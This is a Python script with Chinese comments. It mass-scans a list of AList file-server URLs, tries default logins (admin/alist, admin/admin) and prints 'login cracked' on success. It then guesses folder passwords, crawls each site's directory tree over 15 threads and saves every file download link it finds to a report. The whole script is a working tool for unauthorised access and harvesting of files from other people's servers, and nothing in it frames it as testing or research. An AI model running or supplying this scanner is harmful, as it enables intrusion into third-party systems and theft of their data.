import requests
import os
import concurrent.futures
from collections import deque
import time

# 配置
INPUT_FILE = 'duplicate.txt'
OUTPUT_FILE = 'scan_alist.txt'
MAX_THREADS = 15
TIMEOUT = 5
MAX_DEPTH = 8  # 稍微降低深度以换取更广的探测范围

# 默认尝试的弱口令组合
WEAK_PASSWORDS = [
    {"username": "admin", "password": "alist"},
    {"username": "admin", "password": "admin"},
]

def get_auth_token(base_url):
    """尝试登录获取 Token"""
    login_url = f"{base_url.rstrip('/')}/api/auth/login"
    for payload in WEAK_PASSWORDS:
        try:
            r = requests.post(login_url, json=payload, timeout=TIMEOUT, verify=False)
            if r.status_code == 200:
                res = r.json()
                if res.get("code") == 200:
                    token = res.get("data", {}).get("token")
                    if token:
                        print(f"[Success] 已破解登录: {base_url} ({payload['password']})")
                        return token
        except:
            continue
    return None

def get_alist_list(base_url, path="/", token=None):
    """获取文件列表，支持 Token 和 默认路径密码"""
    api_url = f"{base_url.rstrip('/')}/api/fs/list"
    headers = {"Authorization": token} if token else {}
    
    # 尝试读取，如果目录有密码，默认尝试 'alist'
    payload = {"path": path, "password": "alist", "page": 1, "per_page": 0}
    
    try:
        resp = requests.post(api_url, json=payload, headers=headers, timeout=TIMEOUT, verify=False)
        if resp.status_code == 200:
            data = resp.json()
            # 200 表示成功，或者处理由于密码错误但仍返回的部分数据
            if data.get("code") == 200:
                return data.get("data", {}).get("content", [])
            # 如果 'alist' 密码不对，尝试空密码重试一次
            elif data.get("code") in [401, 500]: 
                payload["password"] = ""
                resp = requests.post(api_url, json=payload, headers=headers, timeout=TIMEOUT, verify=False)
                data = resp.json()
                if data.get("code") == 200:
                    return data.get("data", {}).get("content", [])
    except:
        pass
    return []

def process_url(url):
    """扫描逻辑"""
    print(f"正在扫描站点: {url}")
    # 1. 先尝试破解登录
    token = get_auth_token(url)
    
    local_data = []
    queue = deque([("/", 0)])
    visited_paths = {"/"}

    while queue:
        current_path, depth = queue.popleft()
        if depth > MAX_DEPTH:
            continue

        items = get_alist_list(url, current_path, token)
        if not items:
            continue

        for item in items:
            name = item.get('name')
            is_dir = item.get('is_dir')
            full_path = f"{current_path.rstrip('/')}/{name}"
            
            if is_dir:
                if full_path not in visited_paths:
                    visited_paths.add(full_path)
                    queue.append((full_path, depth + 1))
            else:
                _, ext = os.path.splitext(name)
                ext = ext.lower() if ext else ".no_ext"
                download_url = f"{url.rstrip('/')}/d{full_path}"
                local_data.append((ext, name, download_url))
                
    return local_data

def main():
    requests.packages.urllib3.disable_warnings()
    
    if not os.path.exists(INPUT_FILE):
        print(f"找不到 {INPUT_FILE}")
        return

    with open(INPUT_FILE, 'r') as f:
        urls = list(set([line.strip() for line in f if line.strip().startswith('http')]))

    final_registry = set()

    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        future_to_url = {executor.submit(process_url, url): url for url in urls}
        for future in concurrent.futures.as_completed(future_to_url):
            try:
                site_files = future.result()
                for item in site_files:
                    final_registry.add(item)
            except Exception as e:
                pass

    # 结果分类归并
    ext_map = {}
    for ext, name, d_url in final_registry:
        if ext not in ext_map:
            ext_map[ext] = []
        ext_map[ext].append(f"{name} | {d_url}")

    # 写入本地文件
    from datetime import datetime
    import pytz
    shanghai_tz = pytz.timezone('Asia/Shanghai')
    now_str = datetime.now(shanghai_tz).strftime("%Y-%m-%d %H:%M:%S")

    with open(OUTPUT_FILE, 'w', encoding='utf-8') as f:
        f.write(f"# 扫描报告 - 生成时间: {now_str}\n")
        f.write(f"# 发现唯一文件总数: {len(final_registry)}\n\n")
        
        for ext in sorted(ext_map.keys()):
            f.write(f"[{ext}]\n")
            # 同后缀内按文件名排序
            for line in sorted(ext_map[ext]):
                f.write(line + "\n")
            f.write("\n")

    print(f"全部任务完成，结果存入 {OUTPUT_FILE}")

if __name__ == "__main__":
    main()
